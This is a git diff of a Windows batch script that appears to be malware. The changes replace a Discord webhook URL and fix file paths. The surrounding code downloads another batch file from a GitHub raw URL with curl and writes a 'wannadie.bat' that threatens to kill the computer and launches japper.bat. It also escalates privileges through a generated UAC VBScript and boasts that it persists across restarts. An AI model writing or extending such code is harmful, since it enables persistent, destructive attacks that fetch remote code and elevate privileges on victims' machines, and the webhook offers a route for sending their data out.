@@ -3,7 +3,7 @@ setlocal enabledelayedexpansion
 :: times value in bitluckstarter.bat is not made so yeah please fix later me
 set times="w"
 set neededadmin="F"
-set webhook=https://discord.com/api/webhooks/1485724958289170434/uggu5b0Dny1L_7NG7UJGywOBve8B35MNnFSLtKNdw6zsJgM33Znu-8l5G34amCR6EF-h
+set webhook=https://discord.com/api/webhooks/1487128618189717606/Jh4fhNACI4jLruL64J8wIfIdC_78LbQ1AJIQSp5lCtysEpOX7fJe8_ak6tUxT5A9C6HZ
 cd /d "%~dp0"
 if exist "C:\Users\started.txt" (
     for /F "tokens=* delims=" %%t in ("C:\Users\started.txt") do set times=%%t
@@ -42,7 +42,7 @@ if "%times%" equ "w" (
     if not exist "%~dp0japper_killer.bat" (
         curl -L https://raw.githubusercontent.com/thompog/d/refs/heads/main/japper_killer.bat -o japper_killer.bat
     )
-    if not exist "%localappdata%wannadie.bat" (
+    if not exist "%localappdata%\wannadie.bat" (
         cd /d "%localappdata%"
         echo @echo off>wannadie.bat
         echo echo do you want your cumputer dead>>wannadie.bat
@@ -58,11 +58,11 @@ if "%times%" equ "w" (
         echo if "%%choice%%"=="NO" (echo fine) else (%~dp0japper.bat)>>wannadie.bat
     )
     if "%neededadmin%"=="T" (
-        start "" "%localappdata%wannadie.bat"
+        start "" "%localappdata%\wannadie.bat"
     ) else (
         net session >nul 2>&1
         if %errorlevel% == 0 (
-            start "" "%localappdata%wannadie.bat"
+            start "" "%localappdata%\wannadie.bat"
             goto make_starter
         ) else (
             echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
@@ -79,11 +79,11 @@ if "%times%" equ "w" (
     echo no matter how meny times you restart your PC i will still be here 
     echo you have been here for: "%times%"
     if "%neededadmin%"=="T" (
-        start "" "%localappdata%wannadie.bat"
+        start "" "%localappdata%\wannadie.bat"
     ) else (
         net session >nul 2>&1
         if %errorlevel% == 0 (
-            start "" "%localappdata%wannadie.bat"
+            start "" "%localappdata%\wannadie.bat"
             goto make_starter
         ) else (
             echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
